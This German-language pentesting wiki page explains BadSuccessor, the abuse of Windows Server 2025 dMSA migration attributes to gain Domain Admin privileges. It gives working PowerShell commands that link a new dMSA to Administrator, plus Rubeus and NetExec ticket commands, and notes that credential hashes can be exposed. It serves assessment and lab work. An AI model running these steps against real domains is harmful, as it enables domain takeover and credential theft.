# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

**BadSuccessor** missbraucht den **delegated Managed Service Account** (**dMSA**) Migrations-Workflow, der in **Windows Server 2025** eingeführt wurde. Ein dMSA kann über **`msDS-ManagedAccountPrecededByLink`** mit einem Legacy-Account verknüpft und durch die Migrationszustände verschoben werden, die in **`msDS-DelegatedMSAState`** gespeichert sind. Wenn ein Angreifer einen dMSA in einer beschreibbaren OU erstellen und diese Attribute kontrollieren kann, kann der KDC Tickets für den vom Angreifer kontrollierten dMSA mit dem **authorization context des verknüpften Accounts** ausstellen.

In der Praxis bedeutet das: Ein Low-Privileged-User, der nur delegierte OU-Rechte hat, kann einen neuen dMSA erstellen, ihn auf `Administrator` zeigen lassen, den Migrationszustand abschließen und dann ein TGT erhalten, dessen PAC privilegierte Gruppen wie **Domain Admins** enthält.

## dMSA migration details that matter

- dMSA ist ein **Windows Server 2025**-Feature.
- `Start-ADServiceAccountMigration` setzt die Migration in den **started**-Zustand.
- `Complete-ADServiceAccountMigration` setzt die Migration in den **completed**-Zustand.
- `msDS-DelegatedMSAState = 1` bedeutet, Migration gestartet.
- `msDS-DelegatedMSAState = 2` bedeutet, Migration abgeschlossen.
- Während einer legitimen Migration soll der dMSA den ersetzten Account transparent ersetzen, sodass KDC/LSA den Zugriff beibehalten, den der vorherige Account bereits hatte.

Microsoft Learn weist außerdem darauf hin, dass während der Migration der ursprüngliche Account an den dMSA gebunden ist und der dMSA auf das zugreifen soll, worauf der alte Account zugreifen konnte. Genau diese Sicherheitsannahme missbraucht BadSuccessor.

## Anforderungen

1. Eine Domain, in der **dMSA existiert**, was bedeutet, dass auf der AD-Seite **Windows Server 2025**-Support vorhanden ist.
2. Der Angreifer kann `msDS-DelegatedManagedServiceAccount`-Objekte in einer OU **erstellen** oder hat dort gleichwertige weitreichende Child-Object-Creation-Rechte.
3. Der Angreifer kann die relevanten dMSA-Attribute **schreiben** oder den gerade erstellten dMSA vollständig kontrollieren.
4. Der Angreifer kann Kerberos-Tickets aus einem domain-joined Kontext oder über einen Tunnel anfordern, der LDAP/Kerberos erreicht.

### Praktische Prüfungen

Das sauberste Operator-Signal ist zu verifizieren, ob Domain-/Forest-Level passen und zu bestätigen, dass die Umgebung bereits den neuen Server-2025-Stack verwendet:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Wenn du Werte wie `Windows2025Domain` und `Windows2025Forest` siehst, behandle **BadSuccessor / dMSA migration abuse** als Prioritätsprüfung.

Du kannst auch schreibbare OUs enumerieren, die für dMSA-Erstellung delegiert wurden, mit öffentlichen Tools:
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Missbrauchsablauf

1. Erstelle eine dMSA in einer OU, in der du delegierte create-child-Rechte hast.
2. Setze **`msDS-ManagedAccountPrecededByLink`** auf den DN eines privilegierten Ziels wie `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Setze **`msDS-DelegatedMSAState`** auf `2`, um die Migration als abgeschlossen zu markieren.
4. Fordere ein TGT für die neue dMSA an und verwende das zurückgegebene Ticket, um auf privilegierte Dienste zuzugreifen.

PowerShell-Beispiel:
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Ticket-Anfrage / Beispiele für Operational Tooling:
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Warum das mehr als Privilege Escalation ist

Während einer legitimen Migration muss Windows auch das neue dMSA verwenden, um Tickets zu verarbeiten, die vor dem Cutover für das vorherige Konto ausgestellt wurden. Deshalb kann dMSA-bezogenes Ticket-Material im **`KERB-DMSA-KEY-PACKAGE`**-Flow **aktuelle** und **vorherige** Keys enthalten.

Bei einer vom Angreifer kontrollierten Fake-Migration kann dieses Verhalten BadSuccessor in Folgendes verwandeln:

- **Privilege escalation** durch Vererbung privilegierter Gruppen-SIDs im PAC.
- **Credential material exposure** weil die Behandlung des vorherigen Keys in anfälligen Workflows Material offenlegen kann, das dem RC4/NT hash des Vorgängers entspricht.

Damit ist die Technik sowohl für direkte Domain-Takeover als auch für Folgeoperationen wie pass-the-hash oder breitere Credential-Kompromittierung nützlich.

## Hinweise zum Patch-Status

Das ursprüngliche BadSuccessor-Verhalten ist **nicht nur ein theoretisches Preview-Problem von 2025**. Microsoft hat **CVE-2025-53779** zugewiesen und im **August 2025** ein Security Update veröffentlicht. Halte diesen Angriff dokumentiert für:

- **labs / CTFs / assume-breach exercises**
- **unpatched Windows Server 2025 environments**
- **Validierung von OU-Delegations und dMSA-Exposition während Assessments**

Gehe nicht davon aus, dass eine Windows Server 2025-Domain verwundbar ist, nur weil dMSA existiert; prüfe den Patch-Stand und teste sorgfältig.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
